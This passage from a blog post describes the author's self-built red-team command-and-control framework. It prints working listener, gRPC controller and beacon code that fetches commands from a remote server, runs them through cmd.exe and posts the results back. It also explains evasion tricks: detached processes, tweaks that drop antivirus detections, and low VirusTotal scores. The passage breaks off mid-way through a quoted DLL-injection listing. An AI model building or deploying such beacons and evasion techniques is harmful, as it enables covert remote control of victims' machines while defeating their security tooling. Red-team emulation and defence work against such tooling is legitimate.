         <span class="n">conn</span><span class="p">.</span><span class="nf">hset</span><span class="p">(</span><span class="sh">'</span><span class="s">beacons</span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">bID</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># Add the beacon ID and command to the redis DB
</span>         <span class="n">date</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">()</span>
         <span class="n">conn</span><span class="p">.</span><span class="nf">hset</span><span class="p">(</span><span class="sh">'</span><span class="s">beacons</span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">date</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">bID</span><span class="si">}</span><span class="s"> + </span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># Create cmd history
</span>         <span class="n">conn</span><span class="p">.</span><span class="nf">hset</span><span class="p">(</span><span class="sh">'</span><span class="s">beacons</span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">bID</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
         <span class="k">return</span> <span class="nf">send_from_directory</span><span class="p">(</span><span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">data</span><span class="p">)</span>
</pre></table></code></div></div><p>The beacon sends a GET for its specific page and again we are just dropping requests with special characters. Once it finds the page, we read the command out of it and respond back with what should be executed, also adding a command history to a Redis database.</p><p>Finally, to get the results of the command:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/schema</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">results</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">bID</span> <span class="o">=</span> <span class="p">{</span><span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">APPSESSIONID</span><span class="sh">'</span><span class="p">]}</span>
        <span class="n">bID</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">bID</span><span class="p">)</span>
        <span class="k">if</span> <span class="nf">set</span><span class="p">(</span><span class="n">bID</span><span class="p">).</span><span class="nf">difference</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">):</span>
         <span class="c1"># We're not going to bother with input sanitization here
</span>         <span class="c1"># If we receive special characters just drop it entirely
</span>         <span class="k">pass</span>
        <span class="k">else</span><span class="p">:</span>
         <span class="n">total</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">Result: </span><span class="si">{</span><span class="n">request</span><span class="p">.</span><span class="n">data</span><span class="si">}</span><span class="s"> from beacon: </span><span class="si">{</span><span class="n">bID</span><span class="si">}</span><span class="sh">'</span>
         <span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">data</span>
         <span class="n">response</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
         <span class="n">response</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
         <span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
         <span class="n">conn</span><span class="p">.</span><span class="nf">hset</span><span class="p">(</span><span class="sh">"</span><span class="s">beacons</span><span class="sh">"</span><span class="p">,</span> <span class="n">bID</span><span class="p">,</span> <span class="n">total</span><span class="p">)</span>
         <span class="k">return</span> <span class="sh">'</span><span class="s">HELO</span><span class="sh">'</span>
</pre></table></code></div></div><p>We use the request.data method as a part of Flask in order to get the contents of the POST request. We then write the results of the command to the Redis database.</p><p>Then we come to the gRPC implementation. There’s much more that goes into this than just the classes here, the <code class="language-plaintext highlighter-rouge">protobuff.proto</code> file outlines the message types like <code class="language-plaintext highlighter-rouge">string</code> and <code class="language-plaintext highlighter-rouge">bool</code> as well as defining our expected results. For this post, however, we will only be looking at the Python class portion.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="k">class</span> <span class="nc">UnaryService</span><span class="p">(</span><span class="n">pb2_grpc</span><span class="p">.</span><span class="n">UnaryServicer</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="k">pass</span>

    <span class="k">def</span> <span class="nf">GetServerResponse</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>

        <span class="c1"># We need an ID (ID for beacon) and message (What to tell the beacon)
</span>        <span class="n">message</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">message</span>
        <span class="n">ID</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">bID</span>
        <span class="n">opt</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">opt</span>
        <span class="k">if</span> <span class="nf">set</span><span class="p">(</span><span class="n">ID</span><span class="p">).</span><span class="nf">difference</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">):</span>
            <span class="c1"># We're not going to bother with input sanitization here
</span>            <span class="c1"># If we receive special characters just drop it entirely
</span>            <span class="k">pass</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">opt</span> <span class="o">==</span> <span class="sh">'</span><span class="s">SC</span><span class="sh">'</span><span class="p">:</span>
                <span class="c1"># If option is to set command, then write it to the file
</span>                <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">ID</span><span class="si">}</span><span class="s">.html</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span> 
                    <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
                <span class="n">result</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">Received command, wrote </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s"> to file </span><span class="si">{</span><span class="n">ID</span><span class="si">}</span><span class="sh">'</span>
                <span class="n">result</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="p">:</span> <span class="n">result</span><span class="p">,</span> <span class="sh">'</span><span class="s">received</span><span class="sh">'</span><span class="p">:</span> <span class="bp">True</span><span class="p">}</span>
                <span class="k">return</span> <span class="n">pb2</span><span class="p">.</span><span class="nc">MessageResponse</span><span class="p">(</span><span class="o">**</span><span class="n">result</span><span class="p">)</span>
            <span class="k">elif</span> <span class="n">opt</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GR</span><span class="sh">'</span><span class="p">:</span>
                <span class="c1"># If option is to get the returned results of a beacon, page the Redis DB for the results
</span>                <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">hget</span><span class="p">(</span><span class="sh">'</span><span class="s">beacons</span><span class="sh">'</span><span class="p">,</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">ID</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
                <span class="n">res</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
                <span class="n">result</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">Getting status of beacon </span><span class="si">{</span><span class="n">ID</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">res</span><span class="si">}</span><span class="sh">'</span>
                <span class="n">result</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="p">:</span> <span class="n">result</span><span class="p">,</span> <span class="sh">'</span><span class="s">received</span><span class="sh">'</span><span class="p">:</span> <span class="bp">True</span><span class="p">}</span>
                <span class="k">return</span> <span class="n">pb2</span><span class="p">.</span><span class="nc">MessageResponse</span><span class="p">(</span><span class="o">**</span><span class="n">result</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span> <span class="k">pass</span>
</pre></table></code></div></div><p>This class is designed to take input from the controller program and do a select number of things. We can either set a command or get the returned result. Depending on what is selected, the Redis database is paged looking for different things. This is then communicated over the protobuff back to the controller.</p><p>There are a number of issues with this design that are not addressed here. First, if there is not a reverse proxy in front of the listener that’s routing bad requests away or something similar, then someone could flood the server with requests to generate enough new HTML files to cause a denial of service. Additionally, there is nothing verifying commands sent to beacons so someone could intercept them and issue their own commands to be executed. Solving the latter issue will be a matter of command signing in order to verify legitimacy, but that is still to be implemented.</p><h2 id="the-controller"><span class="mr-2">The Controller</span><a href="#the-controller" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To interact with the backend management, we have a controller that uses the aforementioned gRPC in order to facilitate this.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="k">class</span> <span class="nc">UnaryClient</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">
    Client for gRPC functionality
    </span><span class="sh">"""</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">host</span> <span class="o">=</span> <span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span>
        <span class="n">self</span><span class="p">.</span><span class="n">server_port</span> <span class="o">=</span> <span class="mi">50051</span>

        <span class="c1"># instantiate a channel
</span>        <span class="n">self</span><span class="p">.</span><span class="n">channel</span> <span class="o">=</span> <span class="n">grpc</span><span class="p">.</span><span class="nf">insecure_channel</span><span class="p">(</span>
            <span class="sh">'</span><span class="s">{}:{}</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">server_port</span><span class="p">))</span>

        <span class="c1"># bind the client and the server
</span>        <span class="n">self</span><span class="p">.</span><span class="n">stub</span> <span class="o">=</span> <span class="n">pb2_grpc</span><span class="p">.</span><span class="nc">UnaryStub</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">channel</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">get_url</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">beaconID</span><span class="p">,</span> <span class="n">opt</span><span class="p">):</span>
        <span class="sh">"""</span><span class="s">
        Client function to call the rpc for GetServerResponse
        </span><span class="sh">"""</span>
        <span class="n">message</span> <span class="o">=</span> <span class="n">pb2</span><span class="p">.</span><span class="nc">Message</span><span class="p">(</span><span class="n">bID</span><span class="o">=</span><span class="n">beaconID</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="n">message</span><span class="p">,</span> <span class="n">opt</span><span class="o">=</span><span class="n">opt</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="n">stub</span><span class="p">.</span><span class="nc">GetServerResponse</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
</pre></table></code></div></div><p>This takes an input in the form of <code class="language-plaintext highlighter-rouge">beaconID; commandToSet; choice</code> where the choice is if you want to set a command or get the results. The <code class="language-plaintext highlighter-rouge">Message</code> properties are pre-defined in the <code class="language-plaintext highlighter-rouge">protobuff.proto</code> file as three string parameters, and the <code class="language-plaintext highlighter-rouge">GetServerResponse</code> is defined to return a simple message. gRPC does a lot of heavy lifting for us here.</p><p>In order to actually send the command through the UnaryClient, the following function was used:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">SendCommand</span><span class="p">():</span>
    <span class="sh">'''</span><span class="s">
    This uses gRPC to talk with the C2
    We take the command to run and the beaconID to update and write it to the beacons file
    The C2 awaits the POST response and then sends that back over here
    :param command: The command to run
    :param beaconID: The beacon we want to target
    :return: Get the result of the command
    </span><span class="sh">'''</span>
    <span class="n">beaconID</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Input beacon ID &gt; </span><span class="sh">"</span><span class="p">)</span>
    <span class="n">command</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">If setting new command &gt; </span><span class="sh">"</span><span class="p">)</span>
    <span class="n">opt</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Get Results (GR) or Set Command (SC) &gt; </span><span class="sh">"</span><span class="p">)</span>
    <span class="n">client</span> <span class="o">=</span> <span class="nc">UnaryClient</span><span class="p">()</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="nf">get_url</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="n">command</span><span class="p">,</span> <span class="n">beaconID</span><span class="o">=</span><span class="n">beaconID</span><span class="p">,</span> <span class="n">opt</span><span class="o">=</span><span class="n">opt</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
</pre></table></code></div></div><p>We use the <code class="language-plaintext highlighter-rouge">get_url</code> method defined in the UnaryClient class in order to send this newly constructed message.</p><h2 id="the-beacon"><span class="mr-2">The Beacon</span><a href="#the-beacon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The beacon is the most critical part to a redteam framework. If it’s poorly written, then alerts will pop and data will be corrupted, completely negating any benefits gained from performing these emulations. Upper management is already hesitant to do such tests, so poorly run ones will only further cement why they dislike them. Diving into the beacon, it was rewritten in two new languages for this. That was Go and C#. I had a few different motivations for doing so. The primary one was I felt like I reached the limits of Python. If I wanted to do any more specialized evasion stuff, I would need to import CTypes and at that point, why not just use C right? Additionally, with Go and C#, I could build the final beacon to be compatible for any system as opposed to <em>just</em> an .exe for Windows or <em>just</em> a .py script for <em>Nix</em> systems. The final overarching reason for doing so was also just to learn more. C# is incredibly powerful as outlined in previous posts here and elsewhere. You can unhook NTDLL, overwrite memory locations with what you think should go there, inject shellcode, and so on. Also note, a big reason that Virustotal does not flag these files is not because of any special evasion implemented, but because of their previously unknown structure making static analysis almost useless.</p><h3 id="lets-start-with-how-it-went-with-go-first"><span class="mr-2">Let’s start with how it went with Go first.</span><a href="#lets-start-with-how-it-went-with-go-first" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Go was without a doubt far quicker to transition from Python to than C#. The syntax was very similar and libraries felt like they functioned much the same way. For instance, a GET request in Go would look like this:</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">client</span> <span class="o">:=</span> <span class="n">http</span><span class="o">.</span><span class="n">Client</span><span class="p">{}</span> <span class="c">// Make our web client structure</span>
<span class="n">req</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">http</span><span class="o">.</span><span class="n">NewRequest</span><span class="p">(</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"http://google.com"</span><span class="p">,</span> <span class="no">nil</span><span class="p">)</span> <span class="c">// Define a new request</span>
<span class="n">req</span><span class="o">.</span><span class="n">Header</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="s">"User-Agent"</span><span class="p">,</span> <span class="err">'</span><span class="n">Im</span> <span class="n">a</span> <span class="n">super</span> <span class="n">nifty</span> <span class="n">header</span><span class="err">'</span><span class="p">)</span> <span class="c">// Add some cool new headers</span>
<span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">client</span><span class="o">.</span><span class="n">Do</span><span class="p">(</span><span class="n">req</span><span class="p">)</span> <span class="c">// Send it off</span>
</pre></table></code></div></div><p>And the same thing in Python:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">'</span><span class="s">User-Agent</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Im a super nifty header</span><span class="sh">'</span> <span class="c1"># Set up a cool header
</span><span class="p">}</span>
<span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">http://google.com</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span> <span class="c1"># Send the request
</span></pre></table></code></div></div><p>Go requires you to do a little more setup than Python, but otherwise it’s much the same.</p><p>This can be seen again in the command execution function. First is how it’s performed in Go:</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">cmd</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">,</span> <span class="s">"/C"</span><span class="p">,</span> <span class="n">beacon_command</span><span class="p">)</span> <span class="c">// exec.Command returns the Cmd struct to execute the named program with the given arguments.</span>
<span class="n">result</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">cmd</span><span class="o">.</span><span class="n">Output</span><span class="p">()</span> <span class="c">// And then get the output, _ here is to grab any errors</span>
<span class="n">hostname</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</pre></table></code></div></div><p>And again in Python:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">command</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">cmd.exe</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">/c</span><span class="sh">'</span><span class="p">,</span> <span class="n">beacon_command</span><span class="p">]</span> <span class="c1"># Forming the layout of the command here
</span><span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">close_fds</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="nf">communicate</span><span class="p">()</span>
<span class="n">hostname</span> <span class="o">=</span> <span class="n">out</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span>
</pre></table></code></div></div><p>A lot of time was spent on figuring out how commands should be executed. If it’s too obvious that it’s coming from a web request, the EDR will flag it. I spent a while going back and forth on how this should be done. I wanted to execute the command under an entirely new process that wouldn’t inherit any data from the parent process so as to avoid linking back.</p><p><a href="/assets/img/What-I-Learned/no%20parent%20process.png" class="popup img-link "><img data-src="/assets/img/What-I-Learned/no%20parent%20process.png" alt="A parentless process" title="A parentless process" class="lazyload" data-proofer-ignore></a></p><p>It’s actually really neat how this functions though. If you include <code class="language-plaintext highlighter-rouge">creationflags=0x00000008</code>, then you get a fully independant process who’s parent has died for all intents and purposes, but the command spawned still persists. But this had drawbacks. I couldn’t get the command output on things like <code class="language-plaintext highlighter-rouge">dir</code> and that’s a deal breaker for general execution. This is still viable though for edge case scenarios like spawning new persistent processes or sacrificial processes whos context we can execute commands in to avoid crashing the primary process.</p><p>In the end, the flag for detached processes was dropped in favor of more reliable general command execution. <code class="language-plaintext highlighter-rouge">close_fds</code> gets us half way there by keeping the parent file descriptors from being copied to the subprocess though.</p><p>The overall detection for the Go beacon was pretty low. No one on Antiscan picked it up:</p><p><a href="/assets/img/What-I-Learned/antiscan-results.png" class="popup img-link "><img data-src="/assets/img/What-I-Learned/antiscan-results.png" alt="Antiscan" class="lazyload" data-proofer-ignore></a></p><p>And only 6 vendors picked it up on Virustotal:</p><p><a href="/assets/img/What-I-Learned/virustotal-results.png" class="popup img-link "><img data-src="/assets/img/What-I-Learned/virustotal-results.png" alt="VT" class="lazyload" data-proofer-ignore></a></p><p>These low detection rates can primarily be attributed to how Golang is compiled, though I was able to knock Microsoft off the detection list by first assigning the retrieved command to a new variable as opposed to passing it directly to be executed. One other point on Go, typically beacons generated from it are very hard for AV to detect. This is due to them statically linking all the necessary libraries needed for compiling, which bumps the file size up past what some AV’s can handle scanning. This isn’t a new tactic either, the <a href="https://unit42.paloaltonetworks.com/unit42-comnie-continues-target-organizations-east-asia/">Commie malware family padded 64MB of data</a> to their compiled executables in order to avoid being scanned.</p><h3 id="now-how-did-it-go-with-c"><span class="mr-2">Now how did it go with C#?</span><a href="#now-how-did-it-go-with-c" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>I originally wanted to use C++ for this actually, but encountered a number of issues that C# had already resolved. The crux of the Switchblade communication design is GET and POST web requests and, surprisingly, C++ does not have an easy native way to perform these. You have to import another library in order to do this. So not a big deal, go to GitHub, grab one, import it. Ah but the one you grabbed doesn’t compile with the latest version of Visual Studio you have, so should you troubleshoot the compatability issue or use the 2019 version over the 2022 version? I’m sure more experienced developers more familiar with C++ are shouting at this with an easy solution, but in that moment it was just very confusing to figure out.</p><p>Using C# though was much easier comparitively. What took essentially one line in Python, took a few more in C#, but the end result was a very stable HTTP structure. And this was all with builtin structures, no downloading 3rd party libraries from Github and installing them yourself and troubleshooting what version of VS they were made for, it just worked.</p><div class="language-c# highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="k">using</span> <span class="p">(</span><span class="n">client</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">client</span><span class="p">.</span><span class="n">BaseAddress</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Uri</span><span class="p">(</span><span class="s">"https://eoqqzdfuzmgq7gg.m.pipedream.net/"</span><span class="p">);</span>
                <span class="n">HttpResponseMessage</span> <span class="n">response</span> <span class="p">=</span> <span class="n">client</span><span class="p">.</span><span class="nf">GetAsync</span><span class="p">(</span><span class="s">""</span><span class="p">).</span><span class="n">Result</span><span class="p">;</span>
                <span class="n">response</span><span class="p">.</span><span class="nf">EnsureSuccessStatusCode</span><span class="p">();</span>
                <span class="kt">string</span> <span class="n">result</span> <span class="p">=</span> <span class="n">response</span><span class="p">.</span><span class="n">Content</span><span class="p">.</span><span class="nf">ReadAsStringAsync</span><span class="p">().</span><span class="n">Result</span><span class="p">;</span>
                <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Result: "</span> <span class="p">+</span> <span class="n">result</span><span class="p">);</span>
            <span class="p">}</span>
</pre></table></code></div></div><p>Pretty nifty right?</p><p>The original goal with using C++ was also to be able to do a bunch of advanced memory things, like injecting shellcode into running processes. C#, by nature of being a C based language, has all these tools to do memory modification that you would expect with C++! You still have things like CreateRemoteThread, WriteProcessMemory, and LoadLlibraryA.</p><p>For example, look at the <a href="https://codingvision.net/c-inject-a-dll-into-a-process-w-createremotethread">following code taken from Codingvision.net</a>:</p><div class="language-c# highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="k">public</span> <span class="k">static</span> <span class="kt">int</span> <span class="nf">Main</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="c1">// the target process - I'm using a dummy process for this</span>
        <span class="c1">// if you don't have one, open Task Manager and choose wisely</span>
        <span class="n">Process</span> <span class="n">targetProcess</span> <span class="p">=</span> <span class="n">Process</span><span class="p">.</span><span class="nf">GetProcessesByName</span><span class="p">(</span><span class="s">"testApp"</span><span class="p">)[</span><span class="m">0</span><span class="p">];</span>

        <span class="c1">// geting the handle of the process - with required privileges</span>
        <span class="n">IntPtr</span> <span class="n">procHandle</span> <span class="p">=</span> <span class="nf">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_CREATE_THREAD</span> <span class="p">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="p">|</span> <span class="n">PROCESS_VM_OPERATION</span> <span class="p">|</span> <span class="n">PROCESS_VM_WRITE</span> <span class="p">|</span> <span class="n">PROCESS_VM_READ</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="n">targetProcess</span><span class="p">.</span><span class="n">Id</span><span class="p">);</span>

        <span class="c1">// searching for the address of LoadLibraryA and storing it in a pointer</span>
        <span class="n">IntPtr</span> <span class="n">loadLibraryAddr</span> <span class="p">=</span> <span class="nf">GetProcAddress</span><span class="p">(</span><span class="nf">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="s">"LoadLibraryA"</span><span class="p">);</span>

        <span class="c1">// name of the dll we want to inject</span>
        <span class="kt">string</span> <span class="n">dllName</span> <span class="p">=</span> <span class="s">"test.dll"</span><span class="p">;</span>

        <span class="c1">// alocating some memory on the target process - enough to store the name of the dll</span>
        <span class="c1">// and storing its address in a pointer</span>
